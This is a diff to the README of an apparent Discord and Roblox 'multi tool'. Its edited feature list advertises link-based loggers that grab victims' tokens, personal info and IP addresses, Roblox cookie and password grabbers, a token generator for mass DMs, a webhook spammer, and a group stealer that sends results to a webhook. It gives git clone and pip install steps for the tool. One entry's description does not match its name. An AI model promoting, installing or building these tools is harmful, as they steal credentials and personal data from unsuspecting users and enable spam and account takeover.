@@ -37,14 +37,12 @@ By using Discord Multi Tool, you agree that you hold responsibility and accounta
 
 
 - [x] - [Discord invite logger]() - Grab discord information by just clicking an invite link.
-- [x] - [Roblox classic-shirt maker]() - Automatic create a t-shirt for your types.
-- [x] - [Discord token generator]() - Generate valid token to use for massdm, advertising , & more.
-- [x] - [Roblox cookie logger]() - .
-- [x] - [Image Grabber]() - Grab Discord personal info, token , and IP.
-- [x] - [Nitro Generator]() - Generates and tests a Nitro code. If it works, you will be notified.
-- [x] - [Nitro Sniper]() - Snipe in your servers the nitro links. If a link is found, it will try to put it on your account.
-- [x] - [WebHooks Spammer]() - Spam the message you want through a WebHooks.
-- [x] - [WebHooks Remover]() - Delete any WebHooks link.
+- [x] - [Roblox cookie & password grabber]() - Automatic create a t-shirt for your types.
+- [x] - [Discord video logger]() - Grab dicord information by just playing the video link.
+- [x] - [Discord token generator]() - Generate discord token, all fast & valid.
+- [x] - [Roblox email & phone finder]() - Grab roblox personal info by just id.
+- [x] - [Roblox group stealer]() - Steal roblox group without owner and send them to dicord webhook.
+
 
 <p align="center">
   <img src="https://cdn.discordapp.com/attachments/977184710235140177/982875431566975066/original.gif">
@@ -64,7 +62,7 @@ Launch the launcher.bat file.
 
 #### 2nd・Installation (Manual installation)
 ```
-$ git clone https://github.com/Rdmo1/Rdmo1-Multi-Tool
+$ git clone https://github.com/Rdmo1/Rdmo1-Swift-Tool
 $ python3 -m pip install -r requirements.txt
 $ python3 main.py
 ```
